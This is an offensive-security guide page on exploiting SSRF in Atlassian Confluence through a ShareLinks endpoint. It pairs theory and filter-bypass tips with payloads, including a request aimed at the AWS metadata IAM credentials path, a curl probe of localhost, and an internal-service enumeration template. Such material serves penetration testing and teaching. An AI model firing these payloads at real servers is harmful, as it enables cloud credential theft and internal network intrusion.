---
title: Exploiting SSRF Vulnerabilities in Confluence
description: Learn how to exploit SSRF vulnerabilities in Atlassian Confluence using
  ShareLinks for server-side interactions.
keywords:
- Confluence
- SSRF vulnerabilities
- Atlassian Confluence
- ShareLinks SSRF
- HTTP request manipulation
- internal service interaction
- web server architecture
- security vulnerability
- cybersecurity
---

# Confluence

## Context

The objective of this guide is to demonstrate the operational exploitation of Server-Side Request Forgery (SSRF) vulnerabilities in Atlassian Confluence, with a particular focus on ShareLinks and HTTP-based service interaction. Readers should have a foundational understanding of the HTTP protocol, web server architecture, and general SSRF attack methodologies.

## Theory

### Confluence SSRF Attack Surface

Atlassian Confluence is an enterprise wiki platform widely used for web-based collaboration within organizations. Its various features and endpoints can be prone to security vulnerabilities, specifically SSRF. Some Confluence endpoints, such as those involved with ShareLinks, may allow user-supplied URLs to be fetched on the server side. This vulnerability can be leveraged to interact with internal HTTP services that are otherwise inaccessible from the external network.

### ShareLinks SSRF Mechanism

The ShareLinks feature in Confluence can be exploited for SSRF. An attacker can craft a ShareLink or similar request containing a malicious URL. When Confluence processes this request, it may fetch attacker-controlled resources or access internal resources. This happens due to insufficient validation of user-supplied URLs in ShareLinks or preview endpoints, allowing the execution of arbitrary HTTP requests.

### HTTP Request Manipulation in Confluence SSRF

Attackers can utilize techniques such as URL encoding, DNS rebinding, or alternative IP representations to bypass simplistic allow or block lists that might be in place. User input in these scenarios gets reflected in server-side HTTP requests, enabling interactions with internal or external services, thus facilitating exploitation.

## Practice

### Exploiting ShareLinks SSRF in Confluence

- **Identify Target Endpoint:**
  Locate a Confluence ShareLink or preview endpoint that accepts user-supplied URLs, such as `/rest/api/content/{id}/sharelink`.

- **Craft Malicious URL:**
  Craft a payload to target an internal service or resource. For example, attempting to access AWS metadata service:
  
  ```http
  https://confluence.example.com/rest/api/content/12345/sharelink?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
  ```
  Replace `12345` with a valid page ID.

- **Execute SSRF via cURL:**
  Test SSRF to internal services using a command line tool like `curl`:

  ```bash
  curl -k 'https://confluence.example.com/rest/api/content/12345/sharelink?url=http://127.0.0.1:8080/'
  ```
  This command attempts to interact with services running on localhost at port 8080.

- **Enumerate Internal Services:**
  Continue by crafting URLs targeting various internal services:

  ```http
  https://confluence.example.com/rest/api/content/12345/sharelink?url=http://[internal-service]:[port]/
  ```
  Change `[internal-service]` and `[port]` to test different network locations and service endpoints.

- **Analyze Server Response:**
  Evaluate the server's responses for data owned by the targeted internal service. Successful SSRF will capture and potentially return data from these hidden network locations.

This method allows for the enumeration and interaction with internal, HTTP-based services using Confluence's SSRF vulnerability.

## Tools

- **curl**
- **Burp Suite**